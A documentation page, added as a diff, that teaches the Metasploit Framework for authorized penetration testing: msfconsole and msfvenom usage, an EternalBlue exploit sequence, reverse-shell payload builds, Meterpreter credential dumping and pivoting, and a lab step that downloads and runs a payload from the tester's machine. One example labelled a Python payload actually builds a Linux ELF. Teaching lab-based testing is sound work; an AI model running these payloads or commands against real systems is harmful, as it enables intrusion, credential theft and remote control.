@@ -1,0 +1,249 @@
+---
+title: "Metasploit Framework"
+description: "Practical guide to Metasploit, installation, workflow (recon → exploit → post-exploit), common modules, msfconsole and msfvenom usage, and safe lab exercises."
+tags: [metasploit, penetration-testing, exploitation, tools, ethical-hacking]
+---
+
+**Metasploit** is the most widely used exploitation framework in security testing. It bundles hundreds of exploits, payloads, scanners, and utilities into a single platform so you can validate vulnerabilities in a controlled, repeatable way.
+
+This guide walks you through the Metasploit workflow, how to use `msfconsole` and `msfvenom`, common module types, and safe hands-on labs. Read this as a practical operator’s handbook — not a recipe for misuse. Always get written permission before testing production systems.
+
+## Safety & Ethics (Short, but critical)
+
+- **Only test systems you own or have explicit written authorization to test.**  
+- Use isolated labs (local VMs, VulnHub, Metasploitable, Hack The Box labs) for practice.  
+- Never weaponize exploits against third-party infrastructure.  
+- Keep detailed notes and follow your engagement’s rules of engagement (scope, allowed hours, reporting).
+
+Metasploit is powerful — treat it responsibly.
+
+## What Metasploit Gives You
+
+* A modular architecture of **exploits**, **payloads**, **auxiliary** modules (scanners, fuzzers), and **post-exploitation** modules.  
+* `msfconsole`: interactive console interface and primary workflow.  
+* `msfvenom`: payload and shellcode generator (replaces older `msfpayload` / `msfencode`).  
+* Integration with databases for target management and automation (e.g., `msfdb`).
+
+## Installation (Quick Notes)
+
+On Kali Linux, Metasploit is preinstalled and maintained via packages.  
+On other systems, use the official installers or package managers. Also ensure `postgresql` is running when using the Metasploit database.
+
+Example (simple startup on Kali):
+```bash
+# Start PostgreSQL (if needed)
+sudo service postgresql start
+
+# Start Metasploit console
+msfconsole
+```
+
+Initialize the database (if required):
+
+```bash
+msfdb init
+```
+
+## Core Concepts & Module Types
+
+* **Exploit** — code that takes advantage of a vulnerability to gain access (e.g., `exploit/windows/smb/ms17_010_eternalblue`).
+* **Payload** — code executed on the target after exploitation (reverse shell, Meterpreter).
+* **Auxiliary** — non-exploit modules for scanning, fuzzing, brute-forcing, and info gathering.
+* **Post** — modules run *after* access is obtained (credential dumping, persistence, pivoting).
+* **Encoder** — optionally obfuscates payloads to bypass naive signature detection. Use responsibly and with awareness of detection trade-offs.
+
+## Typical Metasploit Workflow
+
+1. **Reconnaissance & Scanning** — identify live hosts and services (`nmap`, Metasploit auxiliary scanners).
+2. **Select Exploit** — pick an exploit that matches a discovered service/version.
+3. **Choose Payload** — pick a payload appropriate to your goal (e.g., `meterpreter/reverse_tcp`).
+4. **Set Options** — configure `RHOST`, `RPORT`, `LHOST`, `LPORT`, and other module-specific options.
+5. **Launch** — run the exploit and catch the session with a listener.
+6. **Post-Exploitation** — gather evidence, escalate privileges, and document findings.
+7. **Report** — present clear reproduction steps, impact, and remediation.
+
+## msfconsole — Basic Commands
+
+`msfconsole` is the primary interactive interface. Start it simply by running:
+
+```bash
+msfconsole
+```
+
+Key commands inside `msfconsole`:
+
+* `search <term>` — find modules, e.g. `search ms17_010`
+* `use <module>` — select a module, e.g. `use exploit/windows/smb/ms17_010_eternalblue`
+* `show options` — show required module options
+* `set RHOSTS 192.168.56.101` — set target hosts
+* `set LHOST 192.168.56.1` — set your machine IP for reverse connections
+* `set PAYLOAD windows/meterpreter/reverse_tcp` — choose payload
+* `exploit` or `run` — execute the module
+* `sessions -l` — list open sessions
+* `sessions -i <id>` — interact with a session
+* `background` — background an interactive session and return to msfconsole
+* `jobs` — list running background jobs
+* `db_nmap <options>` — run nmap and import results into Metasploit DB
+
+Example quick workflow:
+
+```text
+msf6 > search smb
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > show options
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.56.101
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.56.1
+msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue) > exploit
+```
+
+## msfvenom — Crafting Payloads & Shellcode
+
+`msfvenom` builds payloads that you can embed into files or run on targets. It supports many formats and encoders.
+
+Examples:
+
+* Generate a Windows reverse shell EXE:
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o shell.exe
+```
+
+* Generate a staged Python payload (raw):
+
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o shell.elf
+```
+
+* Generate a base64-encoded shell for embedding:
+
+```bash
+msfvenom -p cmd/unix/reverse_bash LHOST=192.168.56.1 LPORT=4444 -f raw | base64 -w0
+```
+
+**Important:** Many payloads are detected by AV and EDR; testing in controlled labs is best.
+
+## Useful Auxiliary Modules
+
+* `auxiliary/scanner/portscan/tcp` — port scanning from Metasploit
+* `auxiliary/scanner/http/title` — pull web page titles for many hosts
+* `auxiliary/scanner/smb/smb_version` — SMB version fingerprinting
+* `auxiliary/scanner/ssh/ssh_login` — brute-force SSH credentials (only in-scope)
+
+Auxiliary modules are handy for scripted discovery and integrating reconnaissance into a single workflow.
+
+## Meterpreter — The Default Post-Exploitation Payload
+
+**Meterpreter** is a powerful, in-memory payload that gives you an interactive shell and many post-exploitation features like:
+
+* `sysinfo` — view target information
+* `getuid` — current user context
+* `pwd` / `ls` — basic filesystem navigation
+* `upload` / `download` — file transfer
+* `migrate` — move to another process (for stability/persistence)
+* `hashdump` — dump password hashes (requires privileges)
+* `screenshare` / `screenshot` — capture the desktop (ethical constraints apply)
+
+Example session:
+
+```text
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > upload /tmp/patch.exe C:\\Windows\\Temp\\patch.exe
+meterpreter > execute -f C:\\Windows\\Temp\\patch.exe
+```
+
+Always remember: actions like `hashdump`, `screenshare`, and credential harvesting escalate impact and must be explicitly allowed in your engagement scope.
+
+## Post-Exploitation & Pivoting
+
+After getting a session you may:
+
+* Escalate privileges (local exploits, misconfigurations).
+* Harvest credentials (cached tokens, password stores).
+* Pivot to internal networks using port forwarding or SOCKS proxy:
+
+  ```text
+  meterpreter > run autoroute -s 10.10.0.0/24
+  use auxiliary/server/socks_proxy
+  set SRVPORT 1080
+  run
+  # Configure proxychains or Burp to use SOCKS proxy
+  ```
+
+Pivoting lets you reach internal services not directly accessible from your initial foothold — again, only in-scope.
+
+## Hands-On Labs (Safe & Isolated)
+
+### Lab A — Metasploitable 2 Basic Exploit (Local VM)
+
+1. Download and run a Metasploitable VM and a Kali VM on the same host-only network.
+2. From Kali: `nmap -sV -p- 192.168.56.101` to discover services.
+3. In `msfconsole`: `search vsftpd` → `use exploit/unix/ftp/vsftpd_234_backdoor` (example module)
+4. Set `RHOSTS`, `LHOST`, choose payload and `exploit`.
+5. Interact with the session and run `sysinfo`.
+6. Document steps and revert VMs after the lab.
+
+### Lab B — Generate a Payload and Catch a Session (Local HTTP delivery)
+
+1. On Kali: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o /var/www/html/shell.elf`
+2. Start a simple HTTP server: `python3 -m http.server --directory /var/www/html 8000`
+3. On a controlled target VM, download and run the ELF: `wget http://192.168.56.1:8000/shell.elf && chmod +x shell.elf && ./shell.elf`
+4. In `msfconsole`, set `exploit/multi/handler` with the matching payload and `exploit` to catch the session.
+
+**Important:** Use only in lab environments. Do not test these techniques against third-party servers.
+
+## Reporting & Evidence
+
+When a Metasploit test is part of an engagement, capture and record:
+
+* Exact module names and versions used.
+* Module options (`show options`) and payload details.
+* Timestamps of activities and session outputs (screenshots, logs).
+* Impact analysis: what an attacker could access and how to remediate.
+
+A concise proof-of-concept and step-by-step reproduction in the report helps developers fix issues quickly.
+
+## Common Pitfalls & Tips
+
+* **AV/EDR may block or detect payloads.** Use controlled labs or staging environments.
+* **Metasploit modules can be noisy.** Know when to avoid `-A` or aggressive scripts in production.
+* **Meterpreter stability:** Migrate to stable processes after exploitation for long-lived sessions.
+* **Network routing:** Ensure `LHOST` is reachable by the target (NAT issues often break callbacks). Use reverse proxies or port forwarding if needed.
+* **Maintain logs:** Keep detailed logs for legal and remediation purposes.
+
+## Quick Reference Commands
+
+```bash
+# Start console
+msfconsole
+
+# Search for modules
+search smb
+
+# Use a module
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Show and set options
+show options
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.1
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+# Run exploit
+exploit
+
+# Generate payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe -o shell.exe
+
+# Start handler
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.56.1
+set LPORT 4444
+run
+```
+
+## Final Thoughts
+
+Metasploit is a professional framework for validating vulnerabilities and demonstrating impact. It accelerates testing workflows and supports powerful post-exploitation tasks — but its power demands responsibility. Practice in isolated labs, follow legal constraints, and always deliver clear remediation guidance when you test systems.
